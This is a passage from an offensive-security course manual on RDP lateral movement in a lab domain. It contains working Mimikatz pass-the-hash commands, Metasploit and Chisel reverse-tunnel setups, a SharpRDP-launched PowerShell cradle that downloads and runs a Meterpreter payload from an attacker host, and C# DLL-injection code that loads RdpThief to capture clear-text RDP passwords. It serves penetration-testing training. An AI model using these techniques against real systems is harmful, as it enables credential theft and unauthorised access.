network login with RDP. 
A network login does not require clear text credentials and will not store them in memory, 
essentially disabling single sign-on. This type of login is commonly used by service accounts. 
We can use restricted admin mode by supplying the /restrictedadmin argument to mstsc.exe. 
When we supply this argument, the current login session is used to authenticate the session as 
shown in Figure 232. Note that we do not enter a password for this transaction. 
 
Figure 232: RDP login with restricted admin mode 
Since we are logged in as the dave domain user, the network login is executed as that user. This 
gives us an RDP session as dave on appsrv01. 
If we open an administrative prompt and once again launch Mimikatz, we can attempt to dump 
the NTLM hash: 
mimikatz # privilege::debug 
Privilege '20' OK 
 
mimikatz # sekurlsa::logonpasswords 
... 
 
Authentication Id : 0 ; 2225141 (00000000:0021f3f5) 
Session           : RemoteInteractive from 2 
User Name         : dave 
Domain            : corp1 
Logon Server      : DC01 
 
784 (Microsoft, 2016), https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/windows-logon-scenarios 
785 (Microsoft, 2020), https://www.microsoft.com/en-gb/download/details.aspx?id=36036 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
507 
Logon Time        : 3/18/2020 3:02:47 PM 
SID               : S-1-5-21-1364860144-3811088588-1134232237-2102 
        msv : 
        tspkg : 
        wdigest : 
        kerberos : 
        ssp : 
        credman : 
... 
Listing 604 - NTLM hash is not present for the dave user 
Since we used restricted admin mode, no credentials have been cached, which helps mitigate 
credential theft. 
Restricted admin mode is disabled by default but the setting can be controlled through the 
DisableRestrictedAdmin registry entry at the following path: 
HKLM:\System\CurrentControlSet\Control\Lsa 
Listing 605 - Registry path for DisableRestrictedAdmin 
While restricted admin mode protects against credential theft on the target, it is now possible to 
pass the hash when doing lateral movement with mstsc. 
To demonstrate this, let’s perform lateral movement from the Windows 10 client to appsrv01 as 
the admin domain user by abusing the NTLM hash. 
We will assume that we are already in possession of the admin user NTLM hash and are logged in 
to the Windows 10 client as the dave user. We can then run mimikatz from an administrative 
console and use the pth command to launch a mstsc.exe process in the context of the admin 
user: 
mimikatz # privilege::debug 
Privilege '20' OK 
 
mimikatz # sekurlsa::pth /user:admin /domain:corp1 
/ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin" 
user    : admin 
domain  : corp1 
program : mstsc.exe /restrictedadmin 
impers. : no 
NTLM    : 2892d26cdf84d7a70e2eb3b9f05c425e 
  |  PID  9500 
  |  TID  9420 
  |  LSA Process is now R/W 
  |  LUID 0 ; 39684671 (00000000:025d8a3f) 
  \_ msv1_0   - data copy @ 0000024C0DD4CCA0 : OK ! 
  \_ kerberos - data copy @ 0000024C0DDC19B8 
   \_ aes256_hmac       -> null 
   \_ aes128_hmac       -> null 
   \_ rc4_hmac_nt       OK 
   \_ rc4_hmac_old      OK 
   \_ rc4_md4           OK 
   \_ rc4_hmac_nt_exp   OK 
   \_ rc4_hmac_old_exp  OK 
   \_ *Password replace @ 0000024C0E0BF748 (32) -> null 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
508 
Listing 606 - Launching a mstsc.exe process in the context of the admin user 
Once the command finishes, an instance of mstsc opens as shown in Figure 233. 
 
Figure 233: RDP login with restricted admin mode as admin 
Clicking Connect opens an RDP session on appsrv01 as admin, achieving lateral movement with 
the native RDP client in Windows with only the NTLM hash. 
Even though we opened a session as admin, the dialog suggests we are 
authenticating as dave. This error stems from passing the hash with Mimikatz. 
As mentioned previously, restricted admin mode is not enabled by default. However, if we are in 
possession of a password hash for a local account on the target machine, we can enable it in 
order to be able to use a RDP connection to that target. 
To demonstrate this, we will first disable the restricted admin mode on our appsrv01 target. We’ll 
do this from the RDP session as the admin user we just created by executing the PowerShell 
command in Listing 607. 
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 
DisableRestrictedAdmin 
Listing 607 - Deleting registry key required to use restricted admin mode 
With restricted admin mode disabled, we’ll verify that we indeed can no longer log in by first 
logging out of the RDP session on appsrv01 and immediately relaunching it from Mimikatz. When 
we click Connect, we are presented with the error message shown in Figure 234, which indicates 
that restricted admin mode is disabled: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
509 
 
Figure 234: RDP login with restricted admin mode is blocked 
At this point, we are able to fully demonstrate our lateral movement. To re-enable restricted 
admin mode, we are going to first launch a local instance of PowerShell on the Windows 10 
machine in the context of the admin user with Mimikatz. 
mimikatz # sekurlsa::pth /user:admin /domain:corp1 
/ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell 
user    : admin 
domain  : corp1 
program : powershell 
impers. : no 
NTLM    : 2892d26cdf84d7a70e2eb3b9f05c425e 
  |  PID  4312 
  |  TID  9320 
  |  LSA Process was already R/W 
  |  LUID 0 ; 39872945 (00000000:026069b1) 
  \_ msv1_0   - data copy @ 0000024C0DD4C700 : OK ! 
  \_ kerberos - data copy @ 0000024C0DDC1C88 
   \_ aes256_hmac       -> null 
   \_ aes128_hmac       -> null 
   \_ rc4_hmac_nt       OK 
   \_ rc4_hmac_old      OK 
   \_ rc4_md4           OK 
   \_ rc4_hmac_nt_exp   OK 
   \_ rc4_hmac_old_exp  OK 
   \_ *Password replace @ 0000024C0E0C13F8 (32) -> null 
Listing 608 - Pass the hash to start PowerShell in the context of the admin user 
From this PowerShell prompt, we’ll use the Enter-PSSession cmdlet and supply the appsrv01 
hostname as the -Computer argument. This will provide us with shell access to our target 
machine. 
With this access, we’ll create the registry entry as shown in Listing 609. 
PS C:\Windows\system32> Enter-PSSession -Computer appsrv01 
 
[appsrv01]: PS C:\Users\admin\Documents> New-ItemProperty -Path 
"HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 
 
DisableRestrictedAdmin : 0 
PSPath                 : 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
510 
Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentCont 
                         rolSet\Control\Lsa 
PSParentPath           : 
Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentCont 
                         rolSet\Control 
PSChildName            : Lsa 
PSDrive                : HKLM 
PSProvider             : Microsoft.PowerShell.Core\Registry 
 
[appsrv01]: PS C:\Users\admin\Documents> Exit 
PS C:\Windows\system32> 
Listing 609 - Enabling restricted admin mode 
The restricted admin mode setting is updated instantly and we can once again use it to gain 
access to the target. 
It is worth noting that the xfreerdp RDP client,786 which is installed on a Kali system by default, 
supports restricted remote admin connections as well. 
We can demonstrate the previous example with the command shown in Listing 610. Keep in mind 
that the target RDP port must be reachable from our Kali attacking machine. 
kali@kali:~$ xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 
/cert-ignore 
[16:53:44:361] [9749:9750] [INFO][com.freerdp.client.common.cmdline] - loading 
channelEx cliprdr 
... 
Listing 610 - Passing the hash with xfreerdp 
This provides us with the same GUI access we had previously from Windows but this time, we did 
it directly from Kali without the clear text password. 
In this section, we discussed various ways of using Remote Desktop to perform lateral 
movement, using both the conventional method and through restricted admin mode with the 
NTLM hash. Next, we’ll examine more advanced methods. 
13.1.1.1 Exercises 
1. 
Log in to the Windows 10 client as the offsec domain user. Use Mimikatz to pass the hash 
and create an mstsc process with restricted admin enabled in the context of the dave user. 
2. 
Repeat the steps to disable restricted admin mode and then re-enable it as part of the attack 
through PowerShell remoting. 
13.1.2 
Reverse RDP Proxying with Metasploit 
Having GUI access to a compromised machine can greatly simplify our post-exploitation 
activities. However, there are many protection mechanisms that can complicate this approach. 
In this section, we’ll use reverse proxying to access machines that are protected by edge firewalls 
and Network Address Translation (NAT)787 configurations. 
 
786 (Offensive Security, 2014), https://www.kali.org/penetration-testing/passing-hash-remote-desktop/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
511 
NAT is typically implemented at the company edge firewall and segments internal and external IP 
addresses. By design, this prevents us from gaining access to internal machines from the 
Internet. 
For example, if we have compromised an internal workstation through a phishing attack as 
shown in Figure 235, we will not be able to obtain a Remote Desktop session on that system even 
if we have the clear text credentials. 
However, we could establish an egress network connection from the compromised internal client 
to our attack machine and leverage this connection as a tunnel for other traffic, such as an RDP 
session. 
 
Figure 235: Direct access to internal computers is blocked from the Internet 
This is certainly not a new technique, but the concept and implementation can be somewhat 
complicated. We’ll explore a few solutions. First, we’ll use Meterpreter’s built-in reverse proxy 
feature and then we’ll demonstrate a standalone solution. 
 
787 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Network_address_translation 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
512 
 
Note that in the lab for this module, there is no NAT or firewall in place and we 
use reverse tunneling to demonstrate and practice the concept. 
To begin, we must have an established shell on the target system, which in this case is the 
Windows 10 client. To simulate a compromise, we will log in to the machine as the admin user 
and reuse our existing PowerShell or C# tradecraft to launch a 64-bit staged Meterpreter agent 
that will connect to our Kali attacking machine. 
Once the Meterpreter session is active, we’ll send it to the background and switch to the 
multi/manage/autoroute module.788 This will allow us to configure a reverse tunnel through the 
Meterpreter session and use that with a SOCKS proxy789 as shown in Listing 611. 
msf5 exploit(multi/handler) > use multi/manage/autoroute 
 
msf5 post(multi/manage/autoroute) > set session 1 
session => 1 
 
msf5 post(multi/manage/autoroute) > exploit 
 
[!] SESSION may not be compatible with this module. 
[*] Running module against CLIENT 
[*] Searching for subnets to autoroute. 
[+] Route added to subnet 192.168.120.0/255.255.255.0 from host's routing table. 
[*] Post module execution completed 
 
msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a 
 
msf5 auxiliary(server/socks4a) > set srvhost 127.0.0.1 
srvhost => 127.0.0.1 
 
msf5 auxiliary(server/socks4a) > exploit -j 
[*] Auxiliary module running as background job 0. 
 
[*] Starting the socks4a proxy server 
Listing 611 - Autoroute and SOCKS proxy in Metasploit 
The autoroute module creates a reverse tunnel and allows us to direct network traffic into the 
appropriate subnet. 
Since there is no firewall or NAT in this lab, a tunnel is not required, but we can 
still practice the concepts. 
 
788 (Rapid7, 2019), https://github.com/rapid7/metasploit-
framework/blob/master/documentation/modules/post/multi/manage/autoroute.md 
789 (Wikipedia, 2020), <https://en.wikipedia.org/wiki/SOCKS > 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
513 
We can use a local proxy application like Proxychains790 to force TCP traffic through a TOR or 
SOCKS proxy. We can configure it by adding the SOCKS4 proxy IP and port to the config file 
(/etc/proxychains.conf): 
kali@kali:~$ sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'  
Listing 612 - Configuring Proxychains for reverse tunnel 
After configuring Proxychains, we’ll start it along with rdesktop and supply the internal IP address 
as shown in Listing 613. 
kali@kali:~$ proxychains rdesktop 192.168.120.10 
ProxyChains-3.1 (http://proxychains.sf.net) 
Autoselecting keyboard map 'en-us' from locale 
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.120.10:3389-<><>-OK 
Failed to initialize NLA, do you have correct Kerberos TGT initialized ? 
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.120.10:3389-<><>-OK 
Core(warning): Certificate received from server is NOT trusted by this system, an 
exception has been added by the user to trust this specific certificate. 
Connection established using SSL. 
Listing 613 - Remote Desktop is proxied through the tunnel 
After running the command, the RDP connection is established through the SOCKS proxy from 
the Meterpreter session, allowing us to obtain a Remote Desktop session on the internal client. 
The route created by Meterpreter also allows us to access any other computer on that internal 
network. 
Proxychains can be used with many other applications. For example, we can use 
Nmap to conduct an internal network scan or Firefox to browse internal web 
sites. 
In this section we used the proxy functionality of Metasploit to set up a reverse tunnel. Next we’ll 
use a standalone tool for this. 
13.1.2.1 Exercise 
1. 
Configure a reverse tunnel with Metasploit and get RDP access to the Windows 10 client 
machine. 
13.1.3 
Reverse RDP Proxying with Chisel 
It is relatively easy to set up a reverse tunnel with “autorouting” features included in frameworks 
like Metasploit or Cobalt Strike. However, in some cases we may need to rely on a standalone 
application when using products like PowerShell Empire or Covenant. 
The traditional tool of choice for this is the command line version of putty791 called plink. However, 
we’ll leverage Chisel,792 which is a more modern tool. 
 
790 (Sourceforge, 2020), http://proxychains.sourceforge.net/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
514 
Chisel is an open-source tunneling software written in Golang.793 It works by setting up a TCP 
tunnel and performing data transfers over HTTP, while securing it with SSH. Chisel contains both 
client and server components and creates a SOCKS-compliant proxy. 
We can compile the chisel executables ourselves but to do that, we must first install Golang on 
our Kali machine with apt. 
kali@kali:~$ sudo apt install golang 
[sudo] password for kali:  
Reading package lists... Done 
... 
Need to get 65.7 MB of archives. 
After this operation, 331 MB of additional disk space will be used. 
Do you want to continue? [Y/n] y 
... 
Listing 614 - Installing Golang on Kali Linux 
Next, we’ll clone the chisel project from GitHub as demonstrated in Listing 615. 
kali@kali:~$ git clone https://github.com/jpillora/chisel.git 
Cloning into 'chisel'... 
remote: Enumerating objects: 1202, done. 
... 
Listing 615 - Cloning chisel from GitHub 
We need to compile two components of the application. The first is the server, which will run on 
our Kali machine and the other is the client, which will run on Windows. While each component 
contains the same functionality, we must compile one executable for each platform. 
We can compile chisel on Kali with the go build command as shown in Listing 616. 
kali@kali:~$ cd chisel/ 
 
kali@kali:~/chisel$ go build 
go: downloading github.com/gorilla/websocket v1.4.2 
go: downloading github.com/armon/go-socks5 v0.0.0-20160902184237-e75332964ef5 
go: downloading github.com/jpillora/requestlog v1.0.0 
... 
Listing 616 - Compiling chisel for Linux 
With the Linux version compiled, we’ll turn to the Windows version. We can cross-compile chisel 
for other operating systems and architectures with the Golang compiler. We’ll first specify a 64-bit 
Windows executable with the env environment variable794 command. We’ll then set GOOS and 
GOARCH to “windows” and “amd64” respectively. 
 
791 (PuTTY, 2020), https://www.putty.org/ 
792 (Jaime Pillora, 2020), https://github.com/jpillora/chisel 
793 (Golang, 2020), https://golang.org/ 
794 (Golang, 2020), https://golang.org/cmd/go/#hdr-Environment_variables 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
515 
Next, we’ll run go build, specifying the output file name (-o) and linker arguments795 (-ldflags 
“-s -w”796), which will strip debugging information from the resulting binary: 
kali@kali:~/chisel$ env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s 
-w" 
Listing 617 - Compiling chisel for Windows 
Now we can use chisel to set up the reverse tunnel. Let’s configure the server first. We’ll start 
chisel in server mode, specify the listen port with -p and --socks5 to specify the SOCKS proxy 
mode. 
kali@kali:~/chisel$ ./chisel server -p 8080 --socks5 
2020/05/12 15:40:00 server: SOCKS5 server enabled 
2020/05/12 15:40:00 server: Fingerprint 
ae:25:65:f5:6d:fc:c0:26:e0:b5:f8:0a:ec:80:c3:75 
2020/05/12 15:40:00 server: Listening on 0.0.0.0:8080... 
Listing 618 - Starting chisel in server mode 
Next, we’ll configure a SOCKS proxy server with the Kali SSH server. 
To ease the configuration, we’ll first enable password authentication by uncommenting the 
appropriate line in the sshd_config file as shown in Listing 619. After the service is started, we’ll 
connect to it with ssh and supply -N to ensure commands are not executed but merely forwarded 
and -D to configure a SOCKS proxy. 
As subarguments, we must specify the IP and port to configure the SOCKS proxy. Finally, we’ll 
ssh to the localhost: 
kali@kali:~$ sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' 
/etc/ssh/sshd_config 
 
kali@kali:~$ sudo systemctl start ssh.service 
 
kali@kali:~$ ssh -N -D 0.0.0.0:1080 localhost 
The authenticity of host 'localhost (::1)' can't be established. 
ECDSA key fingerprint is SHA256:wO34ll4r18sNzXmfmg/H8uLHz97twv0ovhWuFXXxQkE. 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts. 
kali@localhost's password:  
Listing 619 - Using SSH as a SOCKS proxy 
Now that the Kali server is configured, we’ll shift our focus to the chisel client on the Windows 10 
target. 
First, we’ll transfer the compiled Windows version of chisel to the Windows 10 client machine 
through the existing reverse shell. After transferring the file, we can run it as a client, providing 
the IP address and port of the server instance of chisel and the socks option: 
C:\Tools> chisel.exe client 192.168.119.120:8080 socks 
2020/05/12 14:03:52 client: Connecting to ws://192.168.119.120:8080 
 
795 (Golang, 2020), https://golang.org/cmd/go/#hdr-Compile_packages_and_dependencies 
796 (Golang, 2020), https://golang.org/cmd/link/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
516 
2020/05/12 14:03:52 client: proxy#1:127.0.0.1:1080=>socks: Listening 
2020/05/12 14:03:52 client: Fingerprint 
c9:c4:c0:20:57:ff:6f:43:04:d8:3d:c1:a4:2f:31:39 
2020/05/12 14:03:53 client: Connected (Latency 117.193ms) 
Listing 620 - Starting chisel as client 
As highlighted in the last line of Listing 620, chisel established a connection to our server 
instance. 
Finally, with the tunnel created we can open a RDP session to the Windows 10 client with 
proxychains: 
kali@kali:~$ sudo proxychains rdesktop 192.168.120.10  
ProxyChains-3.1 (http://proxychains.sf.net) 
Autoselecting keyboard map 'en-us' from locale 
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.120.10:3389-<><>-OK 
Failed to initialize NLA, do you have correct Kerberos TGT initialized ? 
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.120.10:3389-<><>-OK 
Listing 621 - RDP session is tunneled with chisel 
Setting up a reverse tunnel is a lot more work than simply using a built-in feature but it’s still 
possible and through it, we can obtain GUI access with RDP in a way that is otherwise not meant 
to be possible. 
We can also use chisel with the classic reverse SSH tunnel syntax by specifying 
the -reverse option instead of --socks5 on the server side.797 
In the next section, we’ll demonstrate an RDP technique that requires neither a GUI nor a reverse 
tunnel. 
13.1.3.1 Exercise 
1. 
Configure a reverse tunnel with chisel and get RDP access to the Windows 10 client 
machine. 
13.1.4 
RDP as a Console 
Although RDP is most often associated with the mstsc GUI client, it can also be used as a 
command-line tool. This technique reduces our overhead while still relying on the RDP protocol, 
which will often blend in well with typical network traffic. 
The RDP application (mstsc.exe) builds upon the terminal services library mstscax.dll.798 This 
library exposes interfaces to both scripts and compiled code through COM objects. 
SharpRDP799,800 is a C# application that uses uses the non-scriptable interfaces exposed by 
mstscax.dll to perform authentication in the same way as mstsc.exe. 
 
797 (0xdf, 2019), https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html 
798 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/termserv/mstscax 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
517 
Once authentication is performed, SharpRDP allows us to execute code through SendKeys.801 In 
this manner, no GUI access is required and setting up a reverse tunnel is unnecessary. 
To demonstrate this, we’ll use the pre-compiled version of SharpRDP located in C:\Tools. We’ll 
specify the computername, username, and password along with the command to be executed. In 
this example, we’ll simply execute Notepad. 
C:\Tools> SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave 
password=lab 
[-] Logon Error           :  -2 - ARBITRATION_CODE_CONTINUE_LOGON 
[+] Connected to          :  appsrv01 
[+] User not currently logged in, creating new session 
[+] Execution priv type   :  non-elevated 
[+] Executing notepad 
[+] Disconnecting from    :  appsrv01 
[+] Connection closed     :  appsrv01 
Listing 622 - Spawning Notepad with SharpRDP 
Since this is not terribly useful, we’ll extend this example to obtain a reverse Meterpreter shell. 
First, we’ll generate a Meterpreter executable and place it in our Apache server web root, then 
we’ll set up msfconsole to catch the shell. 
Finally, we’ll use SharpRDP to execute a PowerShell download cradle on appsrv01 that pulls the 
Meterpreter executable and subsequently executes it with stacked commands: 
C:\Tools> sharprdp.exe computername=appsrv01 command="powershell (New-Object 
System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 
'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave 
password=lab 
[-] Logon Error           :  -2 - ARBITRATION_CODE_CONTINUE_LOGON 
[+] Connected to          :  appsrv01 
[+] User not currently logged in, creating new session 
[+] Execution priv type   :  non-elevated 
[+] Executing powershell (new-object 
system.net.webclient).downloadfile('http://192.168.119.120/met.exe', 
'c:\windows\tasks\met.exe'); c:\windows\tasks\met.exe 
[+] Disconnecting from    :  appsrv01 
[+] Connection closed     :  appsrv01 
Listing 623 - Spawning a reverse Meterpreter shell through SharpRDP 
This results in a Meterpreter shell on our Kali machine as displayed in Listing 624: 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTP reverse handler on http://192.168.119.120:443 
[*] http://192.168.119.120:443 handling request from 192.168.120.6; (UUID: nwv7gu7a) 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.6:52261) 
Listing 624 - Reverse Meterpreter shell 
 
799 (Steven F, 2020), https://github.com/0xthirteen/SharpRDP 
800 (Steven F, 2020), https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3 
801 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/termserv/imsrdpclientnonscriptable-sendkeys 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
518 
Very nice. We can use this technique to perform command line lateral movement through RDP 
with SharpRDP without the need for GUI access. 
13.1.4.1 Exercise 
1. 
Repeat the steps in this section to get a reverse Meterpreter shell through the use of 
SharpRDP. 
13.1.5 
Stealing Clear Text Credentials from RDP 
At this point, we have covered multiple techniques that leverage features of RDP for lateral 
movement purposes. In this section, we’ll demonstrate how to recover the clear text credentials 
that are used when a RDP session is initiated. 
Keyloggers are often used to capture clear text credentials. However, it can be 
difficult to isolate passwords with a generic keylogger and lengthy sessions can 
result in very verbose output, which can be difficult to parse. 
When a user creates a Remote Desktop session with mstsc.exe, they enter clear text credentials 
into the application. In this section, we are going to analyze an application that can detect and 
dump these credentials from memory for us, effectively working as a more targeted keylogger. 
This technique relies on the concept of API hooking.802 In an earlier module, we used Frida to 
monitor API calls. We can use similar techniques to modify APIs and redirect execution to custom 
code. 
As a basic theoretical example, let’s imagine that we are able to hook the WinExec803 API, which 
can be used to start a new application. The function prototype of WinExec is shown in Listing 625. 
UINT WinExec( 
  LPCSTR lpCmdLine, 
  UINT   uCmdShow 
); 
Listing 625 - Funciton prototype of WinExec 
The first argument (lpCmdLine) is an input buffer that will contain the name of the application we 
want to launch. 
If we are able to pause the execution flow of an application when the API is invoked (like a 
breakpoint in WinDbg), we could redirect the execution flow to custom code that writes a different 
application name into the input buffer. Continuing execution would trick the API into starting a 
different application than the one intended by the user. 
Likewise, we could execute custom code that copies the content of the input buffer, return it to 
us, and continue execution unaltered. This effectively steals information from the application and 
returns it to us. 
 
802 (Infosec Resources, 2014), https://resources.infosecinstitute.com/api-hooking/ 
803 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
519 
One way to do this outside of a debugger is to perform API hooking. Instead of pausing execution, 
we could overwrite the initial instructions of an API at the assembly level with code that transfers 
execution to any custom code we want. The Microsoft-provided unmanaged Detours library804 
makes this possible and would allow an attacker to leak information from any API. 
Our goal is to leverage API hooking to steal the clear text credentials entered into mstsc when 
they are processed by relevant APIs. MDSec805 discovered that the APIs responsible for handling 
the username, password, and domain are CredIsMarshaledCredentialW,806 CryptProtectMemory,807 
and SspiPrepareForCredRead808 respectively. 
As a result of this research, they released RdpThief,809 which uses Detours to hook these APIs. 
The hooks in this tool will execute code that copies the username, password, and domain to a file. 
Finally, RdpThief allows the original code execution to continue as intended. 
RdpThief is written as an unmanaged DLL and must be injected into an mstsc.exe process before 
the user enters the credentials. 
Let’s demonstrate RdpThief, reusing our knowledge of DLL injection from previous modules. We’ll 
open the C# console project containing our existing DLL injection code as shown in Listing 626.  
using System; 
using System.Diagnostics; 
using System.Net; 
using System.Runtime.InteropServices; 
using System.Text; 
 
namespace Inject 
{ 
    class Program 
    { 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int 
processId); 
 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint 
dwSize, uint flAllocationType, uint flProtect); 
 
        [DllImport("kernel32.dll")] 
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten); 
 
        [DllImport("kernel32.dll")] 
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr 
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint 
 
804 (Microsoft, 2019), https://github.com/microsoft/Detours/wiki/Using-Detours 
805 (MDSec, 2019), https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/ 
806 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credismarshaledcredentialw 
807 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectmemory 
808 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-sspiprepareforcredread 
809 (MDSec, 2019), https://github.com/0x09AL/RdpThief 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
520 
dwCreationFlags, IntPtr lpThreadId); 
 
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, 
SetLastError = true)] 
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName); 
 
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] 
        public static extern IntPtr GetModuleHandle(string lpModuleName); 
 
        static void Main(string[] args) 
        { 
 
            String dir = 
Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); 
            String dllName = dir + "\\met.dll"; 
 
            WebClient wc = new WebClient(); 
            wc.DownloadFile("http://192.168.119.120/met.dll", dllName); 
 
            Process[] expProc = Process.GetProcessesByName("explorer"); 
            int pid = expProc[0].Id; 
 
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid); 
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40); 
            IntPtr outSize; 
            Boolean res = WriteProcessMemory(hProcess, addr, 
Encoding.Default.GetBytes(dllName), dllName.Length, out outSize); 
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), 
"LoadLibraryA"); 
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, 
addr, 0, IntPtr.Zero); 
        } 
    } 
} 
Listing 626 - DLL injection code 
We’ll obviously need to modify this code. First, we’ll need a compiled version of the RdpThief DLL, 
which is located on the appsrv01 machine in the C:\Tools folder. 
To make our proof of concept work, we’ll update the code in Listing 626 to use the static path of 
the RdpThief DLL. In addition, we want to locate the “mstsc” process instead of “explorer”, which 
gives us this updated code:  
static void Main(string[] args) 
{ 
  String dllName = "C:\\Tools\\RdpThief.dll"; 
  Process[] mstscProc = Process.GetProcessesByName("mstsc"); 
  int pid = mstscProc[0].Id; 
 
  IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid); 
  IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40); 
  IntPtr outSize; 
  Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), 
dllName.Length, out outSize); 
  IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"); 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
521 
  IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, 
IntPtr.Zero); 
} 
Listing 627 - Injection code for RdpThief 
To test this out, we’ll compile the C# project, log in to appsrv01 as dave, and copy the executable 
to C:\Tools. 
Next, we start mstsc.exe followed by our C# console application. 
Finally, we’ll use mstsc to log in to dc01 as the admin user then dump the contents of the 
RdpThief output file to find the clear text credentials. 
C:\Tools> mstsc.exe 
 
C:\Tools> Inject.exe 
 
C:\Tools> type C:\Users\dave\AppData\Local\Temp\6\data.bin 
S e r v e r :   d c 0 1 
 U s e r n a m e :   c o r p 1 \ a d m i n 
 P a s s w o r d :   l a b 
 
